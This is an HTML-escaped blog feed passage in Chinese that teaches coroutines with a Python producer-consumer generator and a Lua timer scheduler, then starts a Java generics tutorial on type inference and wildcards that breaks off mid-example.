&lt;p>传统的生产者-消费者模型是一个线程写消息，一个线程取消息，通过锁机制控制队列和等待，但一不小心就可能死锁。下面是一个用 python 的协程实现的一个生产者消费者模型。给自己 20 分钟，近距离观察这个模型，快速构建协程在你大脑中的基本面貌，分析新模型的优缺点。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">
&lt;span style="color:#75715e"># 生成器函数（消费者）&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">consumer&lt;/span>():
r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;span style="color:#75715e"># 切换任务到生产者并 yield 结果&lt;/span>
n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">yield&lt;/span> r
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> n:
&lt;span style="color:#66d9ef">return&lt;/span>
print(&lt;span style="color:#e6db74">&amp;#39;[CONSUMER] Consuming &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">...&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> n)
r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;200 OK&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># 生产者&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">produce&lt;/span>(c):
&lt;span style="color:#75715e"># 开启生成器&lt;/span>
c&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#66d9ef">None&lt;/span>)
n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> n &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>:
n &lt;span style="color:#f92672">=&lt;/span> n &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
print(&lt;span style="color:#e6db74">&amp;#39;[PRODUCER] Producing &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">...&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> n)
&lt;span style="color:#75715e"># 切换任务到消费者&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> c&lt;span style="color:#f92672">.&lt;/span>send(n)
print(&lt;span style="color:#e6db74">&amp;#39;[PRODUCER] Consumer return: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> r)
c&lt;span style="color:#f92672">.&lt;/span>close()
c &lt;span style="color:#f92672">=&lt;/span> consumer()
produce(c)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行结果&lt;/p>
&lt;pre tabindex="0">&lt;code>
[PRODUCER] Producing 1...
[CONSUMER] Consuming 1...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 2...
[CONSUMER] Consuming 2...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 3...
[CONSUMER] Consuming 3...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 4...
[CONSUMER] Consuming 4...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 5...
[CONSUMER] Consuming 5...
[PRODUCER] Consumer return: 200 OK
&lt;/code>&lt;/pre>&lt;p>模型改用协程，生产者生产消息后直接通过 yield 跳转到消费者开始执行，待消费者执行完毕后，切换回生产者继续生产，效率极高。&lt;/p>
&lt;p>可见，协程本质上就是一个线程的异步串行处理。 它和 nodejs 的异步回调在感觉上有些类似。所以，使用协程时要尽量选择与多路复用 IO 模型等非阻塞 IO 模型进行搭配，以发挥异步处理的最大优势。&lt;/p>
&lt;p>由此可见，相比线程，协程实现的并发逻辑具备无锁、轻量级（无上下文切换）、逻辑简单开发快速等特点。在业务场景合适的情况下，没有理由不选择协程。&lt;/p>
&lt;h2 id="更多的业务场景">更多的业务场景&lt;/h2>
&lt;p>到此协程的基本概念应该已经在你的大脑中留下了一些痕迹。接着请允许我再介绍一个协程的经典示例，帮助你让协程在脑海里变得更加清晰牢固。&lt;/p>
&lt;p>凡是谈到协程的运用，就一定得提到 lua。或许是因为 lua 不支持线程的缘故，在这门纯粹的面向原型的编程语言中协程得到了大量运用。来看一个通过协程与生成器相结合，使用几十行代码开发的一个定时任务调度器。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-lua" data-lang="lua">
&lt;span style="color:#75715e">-- 进攻函数&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">punch&lt;/span>( ... )
&lt;span style="color:#66d9ef">for&lt;/span> i&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
print(&lt;span style="color:#e6db74">&amp;#39;punch&amp;#39;&lt;/span> &lt;span style="color:#f92672">..&lt;/span> i)
&lt;span style="color:#75715e">-- yelid 执行秒数 下次执行位置&lt;/span>
scheduler.wait(&lt;span style="color:#ae81ff">1.0&lt;/span>)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#75715e">-- 防守函数&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">block&lt;/span>( ... )
&lt;span style="color:#66d9ef">for&lt;/span> i&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
print(&lt;span style="color:#e6db74">&amp;#39;block&amp;#39;&lt;/span> &lt;span style="color:#f92672">..&lt;/span> i)
&lt;span style="color:#75715e">-- yelid 执行秒数 下次执行位置&lt;/span>
scheduler.wait(&lt;span style="color:#ae81ff">2.0&lt;/span>)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#75715e">-- 创建协程任务&lt;/span>
scheduler.schedule(&lt;span style="color:#ae81ff">0.0&lt;/span>,coroutine.create(punch))
scheduler.schedule(&lt;span style="color:#ae81ff">0.0&lt;/span>,coroutine.create(block))
&lt;span style="color:#75715e">-- 待处理任务队列&lt;/span>
&lt;span style="color:#66d9ef">local&lt;/span> pending &lt;span style="color:#f92672">=&lt;/span> {}
&lt;span style="color:#75715e">-- 入队函数&lt;/span>
&lt;span style="color:#66d9ef">local&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">schedule&lt;/span>(time,action)
pending[&lt;span style="color:#f92672">#&lt;/span>pending &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {
time &lt;span style="color:#f92672">=&lt;/span> time,
action &lt;span style="color:#f92672">=&lt;/span> action
}
&lt;span style="color:#75715e">-- 按照未来执行时间排序&lt;/span>
sort_by_time(pending)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#75715e">-- 任务执行出让函数&lt;/span>
&lt;span style="color:#66d9ef">local&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">wait&lt;/span>(seconds)
coroutine.yield(seconds)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#75715e">-- 主函数&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>()
&lt;span style="color:#75715e">-- 从队列中获取处理任务&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">#&lt;/span>pending &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> os.clock() &lt;span style="color:#f92672">&amp;lt;&lt;/span> pending[&lt;span style="color:#ae81ff">1&lt;/span>].time &lt;span style="color:#66d9ef">do&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span> &lt;span style="color:#75715e">-- busy-wait&lt;/span>
&lt;span style="color:#75715e">-- 移除任务&lt;/span>
&lt;span style="color:#66d9ef">local&lt;/span> item &lt;span style="color:#f92672">=&lt;/span> remove_first(pending)
&lt;span style="color:#75715e">-- 执行生成器&lt;/span>
&lt;span style="color:#66d9ef">local&lt;/span> _, seconds &lt;span style="color:#f92672">=&lt;/span> coroutine.resume(item.action)
&lt;span style="color:#75715e">-- 将任务加上生成器 yelid 回来的执行时间，放回待处理队列中&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> seconds &lt;span style="color:#66d9ef">then&lt;/span>
later &lt;span style="color:#f92672">=&lt;/span> os.clock() &lt;span style="color:#f92672">+&lt;/span> seconds
sschedule(later, item.action)
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>除了必须利用 busy-wait 进行等待这一小块儿不够优雅的瑕疵以外，我几乎找不出协程实现的调度器有什么缺点。反而因为协程的使用让程序更加的易读了。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>协程让你从并发锁、上下文切换、线程通信、共享内存等桎梏中解脱出来，专心于业务逻辑的思考，极大提高了开发效率。清晰明了的结构让代码具备极高的维护性。单线程的特点可节省上下文切换的开销。另外，协程往往需要配合「生成器」使用，以确保函数在栈里面运行的状态能够得到「暂存」。&lt;/p>
&lt;p>所以，当今后再次遇到并发程序的开发时，试试把你的逻辑交给协程。现在，想想你的代码中哪些地方可以使用到协程？&lt;/p>
&lt;hr>
&lt;p>&lt;em>参考书籍&lt;/em>&lt;/p>
&lt;p>&lt;em>《深入理解计算机系统》&lt;/em>&lt;/p>
&lt;p>&lt;em>《七周七语言-卷 2》&lt;/em>&lt;/p>
&lt;p>&lt;em>参考内容&lt;/em>&lt;/p>
&lt;p>&lt;em>&lt;a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000">廖雪峰的官网&lt;/a>&lt;/em>&lt;/p></description></item><item><title>泛型实战</title><link>https://www.chucklin.net/post/genericity/</link><pubDate>Wed, 15 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/genericity/</guid><description>&lt;p>泛型是一种将运行时异常转化为编译时异常的一种技术，在与集合有关的应用中，我们经常使用泛型来对集合元素的类型做出约束以让代码更加健壮。&lt;/p>
&lt;p>使用泛型是一件非常容易的事情。但是将泛型的理念带入带我们的模块设计中就不是那么容易的事情了。如果你对通配符，类型推导，有限制通配符等等名词还不是很了解，那么本篇文章应该能够帮到你。&lt;/p>
&lt;h2 id="类型推导">类型推导&lt;/h2>
&lt;h3 id="泛型类泛型方法">泛型类/泛型方法&lt;/h3>
&lt;p>类型推导是指，编译器通过检查方法参数的类型来计算类型参数的值，这样的过程称为类型推导。
类型推导的代表性用法为泛型类和泛型方法，比如下面这个 Stack。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 泛型测试
&lt;/span>&lt;span style="color:#75715e"> * 泛型方法,泛型集合
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">GenericApplication&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>E&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> LinkedList&lt;span style="color:#f92672">&amp;lt;&lt;/span>E&lt;span style="color:#f92672">&amp;gt;&lt;/span> list&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 创建集合对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">GenericApplication&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
list &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LinkedList&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 压栈
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param e 压栈成员
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">push&lt;/span>&lt;span style="color:#f92672">(&lt;/span>E e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
list&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addLast&lt;/span>&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 弹栈
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return 栈成员
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> E &lt;span style="color:#a6e22e">pop&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> list&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">pop&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 判断栈成员是否为空
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return true:为空 false:不为空
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> list&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 通过泛型方法,返回泛型检查过的集合。
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param s1 泛型集合1
&lt;/span>&lt;span style="color:#75715e"> * @param s2 泛型集合2
&lt;/span>&lt;span style="color:#75715e"> * @param &amp;lt;T&amp;gt; 泛型参数
&lt;/span>&lt;span style="color:#75715e"> * @return 合并过后的泛型集合
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">unionWithGeneric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> s1&lt;span style="color:#f92672">,&lt;/span> Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> s2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashSet&lt;span style="color:#f92672">&amp;lt;&amp;gt;(&lt;/span>s1&lt;span style="color:#f92672">);&lt;/span>
result&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>s2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> result&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 泛型方法测试函数。
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String args&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> set1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashSet&lt;span style="color:#f92672">();&lt;/span>
set1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> set2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashSet&lt;span style="color:#f92672">();&lt;/span>
set2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
GenericApplication&lt;span style="color:#f92672">&amp;lt;&lt;/span>Number&lt;span style="color:#f92672">&amp;gt;&lt;/span> ga &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> GenericApplication&lt;span style="color:#f92672">();&lt;/span>
Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> ga&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">unionWithGeneric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>set1&lt;span style="color:#f92672">,&lt;/span> set2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过泛型类 GenericApplication 可以创建出支持任意类型，并且受到泛型条件约束的集合对象。
通过泛型方法 unionWithGeneric 可以根据参数的类型返回相应类型的集合对象。
可见，通过类型推导进一步增强了模块的健壮性，使你的 API 运行更加可靠。&lt;/p>
&lt;h2 id="通配符">通配符&lt;/h2>
&lt;h3 id="无限制通配符">无限制通配符&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">Set&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> set &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashSet&lt;span style="color:#f92672">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>无限制的通配符**?**代表任何可能的类型。在上面的代码中，它和 Set 一起代表了一个未知类型元素的 Set 集合，并且用户无法向**?**修饰的集合中 add 任何元素。&lt;/p>
&lt;h3 id="无限制通配符怎么用">无限制通配符怎么用&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 返回两个集合中相同元素的个数
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param s1 集合1
&lt;/span>&lt;span style="color:#75715e"> * @param s2 集合2
&lt;/span>&lt;span style="color:#75715e"> * @return 相同元素的个数
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">numElementsInCommon&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Set&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> s1&lt;span style="color:#f92672">,&lt;/span> Set&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> s2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Object o1 &lt;span style="color:#f92672">:&lt;/span> s1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>s2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>o1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
result&lt;span style="color:#f92672">++;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> result&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>无限制通配符存在的意义在于：加强集合的约束条件，减少元素类型约束被破坏的可能性。
换句话说，如果将 s1、s2 改为源生集合对象，则可能在下面的逻辑中被 add、addAll 等 api 破坏掉元素的类型一致性，引起安全隐患。
如果你不关心集合对象的具体类型，使用无限制的通配符是你最好的选择。因为他可以通过禁止增加元素的手段，帮你避开运行时异常，让你的代码变得更加健壮。&lt;/p>
&lt;h2 id="有限制的通配符">有限制的通配符&lt;/h2>
&lt;p>有限制的通配符是用来解决 api 灵活性的。要理解这句话，首先需要明确参数化类型具有不可变性。&lt;/p>
&lt;h2 id="有限制的通配符怎么用">有限制的通配符怎么用&lt;/h2>
&lt;p>什么叫不可变性？
我们尝试往本章的例子中增加上面两个方法。一个是集体压栈方法、一个是集体弹栈，并且将元素插入到另外一个集合中的方法。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 将集合中所有的元素全部压栈
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param iterable 集合对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pushAllFromEs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Iterable&lt;span style="color:#f92672">&amp;lt;&lt;/span>E&lt;span style="color:#f92672">&amp;gt;&lt;/span> iterable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>E e &lt;span style="color:#f92672">:&lt;/span> iterable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
list&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addLast&lt;/span>&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 将所有元素弹栈,并追加到参数集合中.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param collection 集合对象,必须是泛型参数的父类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">popAllIntoEs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>E&lt;span style="color:#f92672">&amp;gt;&lt;/span> collection&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>isEmpty&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
collection&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>pop&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用下面的代码进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 泛型方法测试函数。
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String args&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
GenericApplication&lt;span style="color:#f92672">&amp;lt;&lt;/span>Number&lt;span style="color:#f92672">&amp;gt;&lt;/span> ga &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> GenericApplication&lt;span style="color:#f92672">();&lt;/span>
List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> listInteger &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;span style="color:#75715e">// 有限制的通配符测试 ? extends E
&lt;/span>&lt;span style="color:#75715e">&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> listInteger &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
ga&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">pushAllFromEs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>listInteger&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// 有限制的通配符测试 ? super E
&lt;/span>&lt;span style="color:#75715e">&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> objects &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
ga&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">popAllIntoEs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>objects&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在你将得到一个编译时异常。原因就在于，类型推导、参数化类型具有不可变性。无论 Type1 与 Type2 是否是继承关系，都有&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Type1&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Type2&lt;span style="color:#f92672">&amp;gt;&lt;/span>
